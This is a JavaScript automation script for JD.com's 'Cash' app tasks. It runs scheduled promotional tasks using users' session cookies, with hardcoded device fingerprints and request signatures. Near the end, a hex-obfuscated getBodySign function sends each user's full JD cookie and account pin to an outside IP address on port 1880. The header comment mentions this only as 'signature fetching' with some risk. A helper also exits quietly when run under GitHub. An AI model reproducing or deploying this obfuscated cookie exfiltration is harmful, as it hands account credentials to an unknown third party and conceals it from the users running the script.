/*
#领现金
京东App首页-领现金
13 7,8  * * * jd_lxj.js
===========================
1、该脚本增加获取签名功能,如果担心风险,请禁用该脚本。
2、建议大家每天执行5次以上且时间放到13:00以后
 */
const $ = new Env('领现金');
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
const notify = $.isNode() ? require('./sendNotify') : '';
const JD_API_HOST = `https://api.m.jd.com`;
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [],cookie = '';

if ($.isNode()) {
    Object.keys(jdCookieNode).forEach((item) => {
        cookiesArr.push(jdCookieNode[item])
    })
    if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
    cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}

!(async () => {
    if (!cookiesArr[0]) {
        $.msg($.name, '【提示】请先获取cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
        return;
    }
    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i];
        if (cookie) {
            $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
            $.index = i + 1;
            $.isLogin = true;
            $.nickName = '';
            $.UserName1 =encodeURIComponent($.UserName)
            $.flag1 = false;
            if (!$.isLogin) {
                $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
                continue
            }
            console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
            
            //逛商品
            $.flag1 = false;
            for (let j=0; j<=20;j++){
                if($.flag1 == true){
                    break;
                }
                //console.log(j)
                data = await homePage();
                if(data.code===0){
                    for (let vo of data.data.result.taskInfos){
                        if(vo.type===4){ //逛商品
                            getSign=await getBodySign(vo.desc, $.UserName1)
                        //console.log(getSign)
                        //await (60000)
                            if (getSign.code === 100){
                                if(vo.doTimes < vo.times){
                			        await doTask(getSign.data);
                			        await $.wait(6000);
                			        $.flag1=false;
            			        }else{
            			            console.log('🐷逛商品任务已完成')
            			            $.flag1 =true;
            			        }
                            }else{
                                console.log(vo.desc+'无可用签名,请稍后重试')
                                $.flag1 =true;
                            }
        			         if(vo.finishFlag===1){
        			             console.log('🐷逛商品任务已完成')
        			             $.flag1 =true;
        			         }
                        }
                        
                    }
                }
            }
            
            
            //做任务
            data = await homePage();
            //console.log(data)
            if(data.code===0){
                console.log('📣助力码：'+data.data.result.invitedCode)
                for (let vo of data.data.result.taskInfos){
                    if(vo.type===2){ //逛店铺
                         getSign=await getBodySign(vo.desc, $.UserName1)
                          if (getSign.code === 100){
                              if(vo.doTimes < vo.times){
            			           await doTask(getSign.data);
            			           await $.wait(6000);
        			           }else{
        			               console.log('🐷逛店铺任务已完成')
        			           }
                          }else{
                              console.log(vo.desc+'无可用签名,请稍后重试')
                          }
			             
    			         if(vo.finishFlag===1){
    			             console.log('🐷逛店铺任务已完成')
    			         }
                    }
                    if(vo.type===5){ //逛会场
                        let body='body=%7B%22type%22%3A5%2C%22taskInfo%22%3A%22https%3A%5C/%5C/prodev.m.jd.com%5C/mall%5C/active%5C/2y1S9xVYdTud2VmFqhHbkcoAYhJT%5C/index.html?babelChannel%3Dttt11%22%7D&build=167922&client=apple&clientVersion=10.3.2&d_brand=apple&d_model=iPhone10%2C2&ef=1&eid=eidI24d781231bs1iTGH8ZbsSEukVSdfFyjhN4kxiWXHSrYWZlESey1gWClSeNPIWaiskUd3%2BLUa%2But1VrRN3I/u4UbuOdicnjjwh/XZnMeBQx7EO/ZO&ep=%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22screen%22%3A%22CJS0CseyCtK4%22%2C%22area%22%3A%22CJTpEJK0XzumDV81CNYmCG%3D%3D%22%2C%22wifiBssid%22%3A%22CwUzCtC3YwGyCwVvDJKmZtZuCNu5DNDwCQSzY2SyZNY%3D%22%2C%22osVersion%22%3A%22CJCkDq%3D%3D%22%2C%22uuid%22%3A%22aQf1ZRdxb2r4ovZ1EJZhcxYlVNZSZz09%22%2C%22adid%22%3A%22HUUnEJU1CJGjEJu2EM00DNLNBUO0CJujCUTNEJGnG0POCtO4%22%2C%22openudid%22%3A%22YtDrEWHvCQHrZJLsC2VtEQYmYtC5YtTtCJDtDJU3CzqmZJHtZtvsDG%3D%3D%22%7D%2C%22ts%22%3A1647145888%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D&ext=%7B%22prstate%22%3A%220%22%2C%22pvcStu%22%3A%221%22%7D&isBackground=N&joycious=84&lang=zh_CN&networkType=wifi&networklibtype=JDNetworkBaseAF&partner=apple&rfs=0000&scope=11&sign=baef4ccbab93a8b4c8d09ee06983a4a1&st=1647166306636&sv=121&uemps=0-0&uts=0f31TVRjBSsSvZGv0uhmMljQJaxu3YZuLV/96ps3VNkg30Jmeuwjyfdo3%2B1nlumTxyjUNvQxXGKQxOQmWHHm/0luPeqHNZee2hyPFxp%2BfC/roOwIKEYqg/6VOjtZuflfMuDvOl7g5MhkyQNMFfPD8apgOlYoblogKR0b5um4ctkbVxlpbNybh7x011unhzOneOTerBRSSdcHoYE4/kGfgA%3D%3D';
			             if(vo.doTimes < vo.times){
    			           await doTask(body);
    			           await $.wait(6000);
    			        }
    			        if(vo.finishFlag===1){
    			             console.log('🐷逛会场任务已完成')
    			         }
                    }
                    if(vo.type===3){ //逛好物
                        let body='body=%7B%22type%22%3A3%2C%22taskInfo%22%3A%22https%3A%5C/%5C/prodev.m.jd.com%5C/mall%5C/active%5C/2y1S9xVYdTud2VmFqhHbkcoAYhJT%5C/index.html?babelChannel%3Dttt11%22%7D&build=167922&client=apple&clientVersion=10.3.2&d_brand=apple&d_model=iPhone10%2C2&ef=1&eid=eidI24d781231bs1iTGH8ZbsSEukVSdfFyjhN4kxiWXHSrYWZlESey1gWClSeNPIWaiskUd3%2BLUa%2But1VrRN3I/u4UbuOdicnjjwh/XZnMeBQx7EO/ZO&ep=%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22screen%22%3A%22CJS0CseyCtK4%22%2C%22area%22%3A%22CJTpEJK0XzumDV81CNYmCG%3D%3D%22%2C%22wifiBssid%22%3A%22EWGyDwVrCzZtCzHuCNK5YtC5ZtVsDJO0EQUmCtc3Ztu%3D%22%2C%22osVersion%22%3A%22CJCkDq%3D%3D%22%2C%22uuid%22%3A%22aQf1ZRdxb2r4ovZ1EJZhcxYlVNZSZz09%22%2C%22adid%22%3A%22HUUnEJU1CJGjEJu2EM00DNLNBUO0CJujCUTNEJGnG0POCtO4%22%2C%22openudid%22%3A%22YtDrEWHvCQHrZJLsC2VtEQYmYtC5YtTtCJDtDJU3CzqmZJHtZtvsDG%3D%3D%22%7D%2C%22ts%22%3A1647525467%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D&ext=%7B%22prstate%22%3A%220%22%2C%22pvcStu%22%3A%221%22%7D&isBackground=N&joycious=84&lang=zh_CN&networkType=wifi&networklibtype=JDNetworkBaseAF&partner=apple&rfs=0000&scope=11&sign=46a313bccb55595f19f23e59700aae40&st=1647590676123&sv=122&uemps=0-0&uts=0f31TVRjBSvB0eZ97PaDF0hK6lQ4KZFhpiZe6JRHPhq9%2BN4TQ2FoWV/GO884PUx8exaESume3rvh0vdCUS4e7RNn45HTyVzI/L/Fj7Krls%2B%2B1zrYNovoKH7OMlnu3l6Js1im3G25b%2BMf8x6yOC5EA04WAJa0Gt33aev25/l8jElCWRPlCM0r18DD0h/8hRUoRKXtXdtu6bWnBNBOUMgJmA%3D%3D';
			             if(vo.doTimes < vo.times){
    			           await doTask(body);
    			           await $.wait(6000);
    			        }
    			        if(vo.finishFlag===1){
    			             console.log('🐷逛好物任务已完成')
    			         }
                    }
                    if(vo.type===16){
			         let body='body=%7B%22type%22%3A16%2C%22taskInfo%22%3A%22https%3A%5C/%5C/pro.m.jd.com%5C/mall%5C/active%5C/3GZJACnxh9TajiEcBvkAMTm2MN7u%5C/index.html?babelChannel%3Dttt22%22%7D&build=167945&client=apple&clientVersion=10.3.4&d_brand=apple&d_model=iPhone13%2C1&ef=1&eid=eidIc98d812270s8YJsI7x6OQ4SE/oNrRYKmoGCbCm002iJf1jMsFpgLxu2RGdxkRDEZNU1pWW0cvbGnPi%2Bhmydl%2BleT3quEAT%2B6VnQbdtggDOcLcrAx&ep=%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22screen%22%3A%22CJOyDIeyDNC2%22%2C%22wifiBssid%22%3A%22Y2GmDzC4CNZwCNTvEWDsCzUnEJLvCQCnDNCzYWUzD2Y%3D%22%2C%22osVersion%22%3A%22CJUkCM4y%22%2C%22area%22%3A%22CJTpEJK0XzumDV81CNYmCG%3D%3D%22%2C%22openudid%22%3A%22ZwTwDNS0DtKzDwS3CtYnY2Y2ZJHsCzLwYJYzDNC0ZtunCzTwZJVwZG%3D%3D%22%2C%22uuid%22%3A%22aQf1ZRdxb2r4ovZ1EJZhcxYlVNZSZz09%22%7D%2C%22ts%22%3A1646096034%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D&ext=%7B%22prstate%22%3A%220%22%2C%22pvcStu%22%3A%221%22%7D&isBackground=N&joycious=59&lang=zh_CN&networkType=wifi&networklibtype=JDNetworkBaseAF&partner=apple&rfs=0000&scope=11&sign=30e4cc820e15224f442495766723a1f3&st=1646113957945&sv=102&uemps=0-1&uts=0f31TVRjBSsqndu4/jgUPz6uymy50MQJQK5a1ZM5c4AnvMg/N1eSzpgBG6HTznJvnzecGU5FVxAXmn/nR9zJLQvRVo0xxWwJaHWjLYByGcyB%2BNiYllicLPUbc8shJWAghQzzvkhe5xXmnBvW3rK5mhGl%2B2juxLxYAvwavtQ%2BX6Uvr6WfeNZHUOCiT1KZcHHy0yYMbWeHKEr6ZW7VV4tnkg%3D%3D';
			        for (let ii = 0; ii < 2; ii++){
			            if(vo.doTimes < vo.times){
    			           await doTask(body);
    			           await $.wait(6000);
    			        }else{
    			            console.log(vo.name + `任务已完成`)
    			            break
			            }
			        }
			        
			    }
			        if(vo.type===17){
    			        if(vo.doTimes < vo.times){
    			           let body='body=%7B%22type%22%3A17%2C%22taskInfo%22%3A%22https%3A%5C/%5C/wqs.jd.com%5C/fortune_island%5C/index2.html?ad_od%3D1%26ptag%3D139254.28.12%22%7D&build=167945&client=apple&clientVersion=10.3.4&d_brand=apple&d_model=iPhone13%2C1&ef=1&eid=eidIc98d812270s8YJsI7x6OQ4SE/oNrRYKmoGCbCm002iJf1jMsFpgLxu2RGdxkRDEZNU1pWW0cvbGnPi%2Bhmydl%2BleT3quEAT%2B6VnQbdtggDOcLcrAx&ep=%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22screen%22%3A%22CJOyDIeyDNC2%22%2C%22wifiBssid%22%3A%22Y2GmDzC4CNZwCNTvEWDsCzUnEJLvCQCnDNCzYWUzD2Y%3D%22%2C%22osVersion%22%3A%22CJUkCM4y%22%2C%22area%22%3A%22CJTpEJK0XzumDV81CNYmCG%3D%3D%22%2C%22openudid%22%3A%22ZwTwDNS0DtKzDwS3CtYnY2Y2ZJHsCzLwYJYzDNC0ZtunCzTwZJVwZG%3D%3D%22%2C%22uuid%22%3A%22aQf1ZRdxb2r4ovZ1EJZhcxYlVNZSZz09%22%7D%2C%22ts%22%3A1646096034%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D&ext=%7B%22prstate%22%3A%220%22%2C%22pvcStu%22%3A%221%22%7D&isBackground=N&joycious=59&lang=zh_CN&networkType=wifi&networklibtype=JDNetworkBaseAF&partner=apple&rfs=0000&scope=11&sign=2a9244d0f694afa362f11e166b5c0fa6&st=1646114598671&sv=101&uemps=0-1&uts=0f31TVRjBSsqndu4/jgUPz6uymy50MQJQK5a1ZM5c4AnvMg/N1eSzpgBG6HTznJvnzecGU5FVxAXmn/nR9zJLQvRVo0xxWwJaHWjLYByGcyB%2BNiYllicLPUbc8shJWAghQzzvkhe5xXmnBvW3rK5mhGl%2B2juxLxYAvwavtQ%2BX6Uvr6WfeNZHUOCiT1KZcHHy0yYMbWeHKEr6ZW7VV4tnkg%3D%3D';
    			           await doTask(body);
    			           await $.wait(6000);
    			           await doTask(body);
    			           await $.wait(6000);
    			           await doTask(body);
    			           await $.wait(6000);
    			        }else{
    			            console.log(vo.name + `任务已完成`)
    			        }
    			    }
                }
            }else{
                console.log('系统返回数据错误')
            }
            
            if (i != cookiesArr.length - 1) {
                await $.wait(2000);
            }
        }
    }
})()
    .catch((e) => $.logErr(e))
    .finally(() => $.done())


function homePage() {
    return new Promise(async resolve => {
        const options = {
            url: `https://106.39.171.220/client.action?functionId=cash_homePage`,
            body: 'body=%7B%7D&build=167945&client=apple&clientVersion=10.3.4&d_brand=apple&d_model=iPhone13%2C1&ef=1&eid=eidIc98d812270s8YJsI7x6OQ4SE/oNrRYKmoGCbCm002iJf1jMsFpgLxu2RGdxkRDEZNU1pWW0cvbGnPi%2Bhmydl%2BleT3quEAT%2B6VnQbdtggDOcLcrAx&ep=%7B%22ciphertype%22%3A5%2C%22cipher%22%3A%7B%22screen%22%3A%22CJOyDIeyDNC2%22%2C%22wifiBssid%22%3A%22Y2GmDzC4CNZwCNTvEWDsCzUnEJLvCQCnDNCzYWUzD2Y%3D%22%2C%22osVersion%22%3A%22CJUkCM4y%22%2C%22area%22%3A%22CJTpEJK0XzumDV81CNYmCG%3D%3D%22%2C%22openudid%22%3A%22ZwTwDNS0DtKzDwS3CtYnY2Y2ZJHsCzLwYJYzDNC0ZtunCzTwZJVwZG%3D%3D%22%2C%22uuid%22%3A%22aQf1ZRdxb2r4ovZ1EJZhcxYlVNZSZz09%22%7D%2C%22ts%22%3A1646096034%2C%22hdid%22%3A%22JM9F1ywUPwflvMIpYPok0tt5k9kW4ArJEU3lfLhxBqw%3D%22%2C%22version%22%3A%221.0.3%22%2C%22appname%22%3A%22com.360buy.jdmobile%22%2C%22ridx%22%3A-1%7D&ext=%7B%22prstate%22%3A%220%22%2C%22pvcStu%22%3A%221%22%7D&isBackground=N&joycious=59&lang=zh_CN&networkType=wifi&networklibtype=JDNetworkBaseAF&partner=apple&rfs=0000&scope=11&sign=18d126029882cc57846f70a38d0106c9&st=1646112288202&sv=122&uemps=0-1&uts=0f31TVRjBSsqndu4/jgUPz6uymy50MQJQK5a1ZM5c4AnvMg/N1eSzpgBG6HTznJvnzecGU5FVxAXmn/nR9zJLQvRVo0xxWwJaHWjLYByGcyB%2BNiYllicLPUbc8shJWAghQzzvkhe5xXmnBvW3rK5mhGl%2B2juxLxYAvwavtQ%2BX6Uvr6WfeNZHUOCiT1KZcHHy0yYMbWeHKEr6ZW7VV4tnkg%3D%3D',
            headers: {
                "Host": "api.m.jd.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie,
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`)
                    console.log(`${$.name} API请求失败，请检查网路重试`)
                } else {
                    if (data) {
                        data = JSON.parse(data);
                    } else {
                        console.log(`服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve(data);
            }
        })
    })
}

function doTask(body={}) {
    return new Promise(async resolve => {
        const options = {
            url: `https://106.39.169.120/client.action?functionId=cash_doTask`,
            body: body,
            headers: {
                "Host": "api.m.jd.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie,
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`)
                    console.log(`${$.name} API请求失败，请检查网路重试`)
                } else {
                    if (data) {
                        //console.log(data)
                        data = JSON.parse(data);
                        if (data.code===0){
                            if(data.data.bizCode==105){
                                console.log('活动太火爆啦')
                            }
                            if(data.data.bizCode==0){
                                console.log(data.data.result.name + ' 执行任务成功')
                            }
                            if(data.data.bizCode==103){
                                console.log(data.data.result.name + ' 任务已完成')
                            }
                        }
                        
                        
                    } else {
                        console.log(`服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve(data);
            }
        })
    })
}


// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}


 var __encode ='',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdb5c9=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x6A\x64\x5F\x6C\x78\x6A\x3F\x73\x6B\x75\x3D","","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x29b8x2,_0x29b8x3){return  new Promise((_0x29b8x4)=>{$[__Oxdb5c9[0x5]]({url:`${__Oxdb5c9[0x0]}${_0x29b8x2}${__Oxdb5c9[0x1]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x29b8x3}},(_0x29b8x5,_0x29b8x6,_0x29b8x7)=>{try{_0x29b8x7= JSON[__Oxdb5c9[0x2]](_0x29b8x7)}catch(e){$[__Oxdb5c9[0x4]](__Oxdb5c9[0x3],e,_0x29b8x6)}finally{_0x29b8x4(_0x29b8x7)}})})}(function(_0x29b8x8,_0x29b8x9,_0x29b8xa,_0x29b8xb,_0x29b8xc,_0x29b8xd){_0x29b8xd= __Oxdb5c9[0x6];_0x29b8xb= function(_0x29b8xe){if( typeof alert!== _0x29b8xd){alert(_0x29b8xe)};if( typeof console!== _0x29b8xd){console[__Oxdb5c9[0x7]](_0x29b8xe)}};_0x29b8xa= function(_0x29b8xf,_0x29b8x8){return _0x29b8xf+ _0x29b8x8};_0x29b8xc= _0x29b8xa(__Oxdb5c9[0x8],_0x29b8xa(_0x29b8xa(__Oxdb5c9[0x9],__Oxdb5c9[0xa]),__Oxdb5c9[0xb]));try{_0x29b8x8= __encode;if(!( typeof _0x29b8x8!== _0x29b8xd&& _0x29b8x8=== _0x29b8xa(__Oxdb5c9[0xc],__Oxdb5c9[0xd]))){_0x29b8xb(_0x29b8xc)}}catch(e){_0x29b8xb(_0x29b8xc)}})({})
